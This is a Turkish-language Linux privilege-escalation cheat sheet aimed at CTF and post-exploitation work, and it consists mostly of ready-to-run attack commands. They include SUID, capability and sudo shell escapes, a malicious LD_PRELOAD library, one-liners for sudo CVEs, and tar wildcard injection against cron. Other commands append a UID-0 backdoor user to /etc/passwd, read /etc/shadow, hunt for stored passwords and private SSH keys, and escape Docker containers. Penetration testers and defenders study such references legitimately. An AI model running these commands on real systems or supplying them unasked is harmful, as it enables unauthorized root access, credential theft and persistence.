# 🐧 Linux Yetki Yükseltme (Privilege Escalation) - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Linux-PrivEsc-red?style=for-the-badge" alt="Linux PrivEsc">
  <img src="https://img.shields.io/badge/Sömürü_Sonrası-orange?style=for-the-badge" alt="Sömürü Sonrası">
  <img src="https://img.shields.io/badge/Root-Erişimi-blue?style=for-the-badge" alt="Root">
  <img src="https://img.shields.io/badge/CTF-Hazır-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Linux sistemlerinde standart kullanıcıdan root yetkilerine yükselme kılavuzu</b>
</p>

---

## 📋 İçindekiler

- [Numaralandırma ve Bilgi Toplama](#-numaralandırma-ve-bilgi-toplama)
- [SUID / SGID Dosyaları](#-suid--sgid-dosyaları)
- [Linux Yetenekleri (Capabilities)](#-linux-yetenekleri-capabilities)
- [Sudo Yetkilerini İstismar Etme](#-sudo-yetkilerini-istismar-etme)
- [Cron Görevleri (Cron Jobs)](#-cron-görevleri-cron-jobs)
- [PATH Ele Geçirme (PATH Hijacking)](#-path-ele-geçirme-path-hijacking)
- [NFS Kök Kısıtlaması (no_root_squash)](#-nfs-kök-kısıtlaması-no_root_squash)
- [Çekirdek Açıkları (Kernel Exploits)](#-çekirdek-açıkları-kernel-exploits)
- [Parola Madenciliği (Password Mining)](#-parola-madenciliği-password-mining)
- [SSH Anahtarları](#-ssh-anahtarları)
- [Yazılabilir Kritik Dosyalar](#-yazılabilir-kritik-dosyalar)
- [Docker Kaçışı (Docker Escape)](#-docker-kaçışı-docker-escape)
- [Hızlı Başvuru ve Kontrol Listesi](#-hızlı-başvuru-ve-kontrol-listesi)

---

## 🔍 Numaralandırma ve Bilgi Toplama

### Sistem Bilgisi

```bash
# Ana makine adı
hostname

# İşletim sistemi ve çekirdek sürümü
cat /etc/os-release
cat /etc/issue
uname -a
uname -r

# Sistem mimarisi
arch
uname -m

# İşlemci bilgisi
cat /proc/cpuinfo
lscpu
```

### Kullanıcı Bilgileri

```bash
# Mevcut kullanıcı ve kimlik numaraları
whoami
id

# Sistemdeki tüm kullanıcılar
cat /etc/passwd
cat /etc/passwd | grep -v "nologin\|false"

# Kullanıcı grupları
groups
cat /etc/group

# Oturum açmış aktif kullanıcılar
w
who
users

# Son giriş kayıtları
last
lastlog

# Sudo yetkilerini sorgulama (en kritik komut!)
sudo -l
```

### Ağ Bilgisi

```bash
# IP adresleri ve arayüzler
ip a
ifconfig

# Yönlendirme tablosu
ip route
route -n

# Dinleyen portlar (Açık yerel servisler)
netstat -tulpn
ss -tulpn

# Aktif bağlantılar
netstat -an
ss -an

# ARP tablosu
arp -a
ip neigh

# DNS ayarları ve yerel çözümleme
cat /etc/resolv.conf
cat /etc/hosts
```

### Çalışan Süreçler ve Servisler

```bash
# Çalışan süreçler
ps aux
ps -ef
ps aux | grep root

# Servis durumları
systemctl list-units --type=service
service --status-all

# Yüklü paketler
dpkg -l                    # Debian/Ubuntu
rpm -qa                    # RHEL/CentOS
```

### Zamanlanmış Görevler (Cron)

```bash
# Kullanıcı crontab'ı
crontab -l

# Sistem crontab dizinleri
ls -la /etc/cron*
cat /etc/crontab
cat /etc/cron.d/*

# Systemd zamanlayıcıları
systemctl list-timers
```

---

## 🔐 SUID / SGID Dosyaları

### SUID Dosyalarını Arama

```bash
# SUID bitine sahip dosyaları bulma
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# SGID bitine sahip dosyaları bulma
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Hem SUID hem SGID arama
find / -perm /6000 -type f 2>/dev/null
```

### Yaygın SUID İkili Dosyaları (Binaries) ve İstismarı

Ayrıntılı istismar yöntemleri için [GTFOBins](https://gtfobins.github.io/) kütüphanesini kontrol edin!

#### **bash**
```bash
# SUID biti atanmış bash ile root kabuğu
./bash -p
```

#### **find**
```bash
find . -exec /bin/sh -p \; -quit
```

#### **vim**
```bash
vim -c ':!/bin/sh'
```

#### **nmap** (Eski sürümlerde interaktif mod)
```bash
nmap --interactive
!sh
```

#### **python**
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

#### **perl**
```bash
perl -e 'exec "/bin/sh";'
```

#### **less / more**
```bash
less /etc/passwd
!/bin/sh
```

#### **cp** (Kritik Dosya Üzerine Yazma)
```bash
# /etc/passwd dosyasını kopyalayıp root kullanıcısı ekleme
LFILE=/etc/passwd
cp /etc/passwd /tmp/passwd.bak
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd $LFILE
```

#### **env**
```bash
env /bin/sh -p
```

---

## ⚡ Linux Yetenekleri (Capabilities)

### Yetenekleri Arama

```bash
# Sistemdeki dosya yeteneklerini listele
getcap -r / 2>/dev/null

# Tehlikeli yetenekler:
# CAP_SETUID - Sürecin UID'sini değiştirme (0/root yapma)
# CAP_NET_RAW - Ham soket açma (Sniffing/Spoofing)
# CAP_DAC_READ_SEARCH - Dosya izinlerini yok sayarak her dosyayı okuma
```

### Yetenekleri İstismar Etme

#### **Python (`cap_setuid`)**
```bash
# Python üzerinde cap_setuid+ep varsa:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### **Perl (`cap_setuid`)**
```bash
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

#### **tar (`cap_dac_read_search`)**
```bash
# İzin kısıtlamasını aşarak /etc/shadow dosyasını arşivle ve oku
tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat etc/shadow
```

#### **vim (`cap_setuid`)**
```bash
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---

## 🔑 Sudo Yetkilerini İstismar Etme

### Sudo İzinlerini Kontrol Etme

```bash
sudo -l
# NOPASSWD satırlarını arayın
# (ALL) veya (root) yetkisiyle çalıştırılabilen programları inceleyin
```

### Sudo İstismar Teknikleri

#### **sudo ALL**
```bash
sudo /bin/bash
sudo su
```

#### **LD_PRELOAD Ortam Değişkeni İstismarı**
`sudo -l` çıktısında `env_keep+=LD_PRELOAD` ifadesi yer alıyorsa:

```bash
# 1. Kötü amaçlı paylaşımlı kütüphane oluşturun:
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# 2. Derleyin:
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 3. İzin verilen herhangi bir sudo programı ile çalıştırın:
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/izin_verilen_komut
```

#### **sudo vim**
```bash
sudo vim -c ':!/bin/sh'
```

#### **sudo less / more**
```bash
sudo less /etc/passwd
!/bin/sh
```

#### **sudo find**
```bash
sudo find /tmp -exec /bin/sh \;
```

#### **sudo tar**
```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

#### **sudo zip**
```bash
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/sh"
```

#### **sudo env**
```bash
sudo env /bin/sh
```

#### **sudo awk**
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### **sudo apache2**
```bash
# Shadow dosyasının ilk satırını (root hash'ini) hata mesajında sızdırır
sudo apache2 -f /etc/shadow
```

### Bilinen Sudo Güvenlik Açıkları
```bash
# Sudo sürümünü kontrol et
sudo --version

# CVE-2019-14287 (sudo < 1.8.28 - Kullanıcı ID -1 atlatması)
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit - Yığın taşması)
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## ⏰ Cron Görevleri (Cron Jobs)

### Cron Görevlerini Tespit Etme

```bash
cat /etc/crontab
ls -la /etc/cron*
cat /etc/cron.d/*

# pspy aracı ile crontab olmadan arka planda dönen süreçleri izleme:
./pspy64
```

### Cron Açıklarını İstismar Etme

#### **Yazılabilir Cron Betiği**
Root yetkisiyle çalışan bir betik yazılabilir durumdaysa:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /yol/gorev_betigi.sh

# Cron tetiklendikten sonra:
/tmp/bash -p
```

#### **Joker Karakter (Wildcard) Enjeksiyonu (`tar *`)**
Cron içerisinde `tar czf /tmp/backup.tar.gz *` gibi kontrolsüz bir joker karakter kullanılıyorsa:
```bash
# İlgili dizin içerisine parametre taklidi yapan dosyalar oluşturun:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

#### **PATH Değişkeni İstismarı**
Crontab başında tanımlanan `PATH` içinde yazılabilir bir dizin varsa ve betik tam yol yerine doğrudan komut çağırıyorsa sahte komut üretin.

---

## 🛤️ PATH Ele Geçirme (PATH Hijacking)

Root tarafından çalıştırılan veya SUID bitine sahip bir program komutları tam yol (`/bin/ls`) yerine göreceli yol (`ls`) ile çağırıyorsa:

```bash
# Sahte komut oluşturun
echo '/bin/bash -p' > /tmp/servis_adi
chmod +x /tmp/servis_adi

# PATH değişkeninin en başına /tmp dizinini ekleyin
export PATH=/tmp:$PATH

# Zafiyetli programı çalıştırın
./zafiyetli_program
```

---

## 📁 NFS Kök Kısıtlaması (no_root_squash)

### NFS Paylaşımlarını İnceleme
```bash
# Saldırgan makineden hedefin paylaşımlarını listele
showmount -e hedef_ip

# Hedefte /etc/exports dosyasını inceleyin
cat /etc/exports
# "no_root_squash" parametresi varsa root yetkileri korunur!
```

### İstismar Adımları
```bash
# Kendi saldırgan makinenizde (root olarak):
mkdir /tmp/nfs
mount -o rw hedef_ip:/paylasim /tmp/nfs
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# Hedef makineye dönün ve çalıştırın:
/paylasim/bash -p
```

---

## 💣 Çekirdek Açıkları (Kernel Exploits)

### Çekirdek Sürümünü Kontrol Etme
```bash
uname -r
uname -a
cat /proc/version
```

### Popüler Çekirdek Exploit'leri

| CVE | Çekirdek Sürümü | Adı |
|-----|-----------------|-----|
| CVE-2016-5195 | 2.x - 4.8.3 | **Dirty COW** |
| CVE-2021-4034 | Neredeyse tüm Linux dağıtımları | **PwnKit** |
| CVE-2021-3156 | sudo < 1.9.5p2 | **Baron Samedit** |
| CVE-2022-0847 | 5.8 - 5.16.11 | **Dirty Pipe** |
| CVE-2022-2588 | 5.x | **DirtyCred** |

---

## 🔑 Parola Madenciliği (Password Mining)

```bash
# Dosyalarda "password" kelimesini arama
grep -rnw '/var/www/' -ie "password" 2>/dev/null
grep -rnw '/home/' -ie "password" 2>/dev/null

# Yapılandırma dosyaları
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php
cat /etc/mysql/my.cnf

# Komut geçmişi dosyaları
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.nano_history

# Ortam değişkenleri
env
printenv
```

---

## 🔐 SSH Anahtarları

```bash
# Özel anahtarları (Private Key) arama
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Bulunan anahtarı kullanarak giriş yapma
chmod 600 id_rsa
ssh -i id_rsa root@localhost
```

---

## 📝 Yazılabilir Kritik Dosyalar

### `/etc/passwd` Dosyası Yazılabilir Durumdaysa

```bash
# 1. Parola hash'i oluşturun (ör. parola: password)
openssl passwd -1 -salt hacker password
# Sonuç: $1$hacker$TzyKlv0/R/c28R.GAeLw.1

# 2. UID=0 ve GID=0 olan yeni bir root kullanıcısı ekleyin:
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0::/root:/bin/bash' >> /etc/passwd

# 3. Giriş yapın:
su hacker
# Parola: password
```

---

## 🐳 Docker Kaçışı (Docker Escape)

### Konteyner İçinde Olduğunuzu Anlama
```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
hostname
```

### Docker Soket Dosyası Erişimi (`docker.sock`)
`/var/run/docker.sock` dosyasına yazma yetkiniz varsa ana işletim sistemini mount edip kaçabilirsiniz:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### Ayrıcalıklı (Privileged) Konteyner
Konteyner `--privileged` parametresiyle başlatılmışsa diskleri doğrudan mount edebilirsiniz:
```bash
fdisk -l
mount /dev/sda1 /mnt
chroot /mnt
```

---

## 📊 Hızlı Başvuru ve Kontrol Listesi

### Hızlı Tek Satırlık Komutlar
```bash
# Kimlik ve sistem özeti
id; hostname; uname -a; cat /etc/issue

# Hızlı SUID araması
find / -perm -4000 -type f 2>/dev/null

# Hızlı sudo kontrolü
sudo -l

# Hızlı yetenekler kontrolü
getcap -r / 2>/dev/null
```

### Otomatik Numaralandırma Araçları

| Araç | Açıklama |
|------|----------|
| **LinPEAS** | En kapsamlı ve renkli yetki yükseltme tarayıcısı |
| **LinEnum** | Hafif ve klasik Linux keşif betiği |
| **pspy** | Root gerektirmeden çalışan süreçleri ve cron'ları izleyen sniffer |

### Hızlı Kontrol Listesi (Checklist)

- [ ] `sudo -l` yetkilerini kontrol edin
- [ ] SUID/SGID dosyalarını listeleyip GTFOBins ile eşleştirin
- [ ] `getcap -r / 2>/dev/null` ile yetenekleri denetleyin
- [ ] Cron betiklerinde yazma izni var mı inceleyin
- [ ] Çekirdek sürümünde bilinen exploit var mı bakın (`uname -r`)
- [ ] `/etc/passwd` veya `/etc/shadow` dosyalarında yazma/okuma hakkı var mı?
- [ ] SSH anahtarlarını (`id_rsa`) tarayın
- [ ] Docker soketi (`docker.sock`) veya ayrıcalıklı konteyner var mı?
- [ ] NFS paylaşımlarında `no_root_squash` parametresi var mı?

---

## 📚 Kaynaklar

- [GTFOBins İkili Dosya Kılavuzu](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

<p align="center">
  <b>🐧 Root Yetkisini Ele Geçirin!</b><br>
  <i>Linux yetki yükseltme yöntemlerinde ustalaşın</i>
</p>
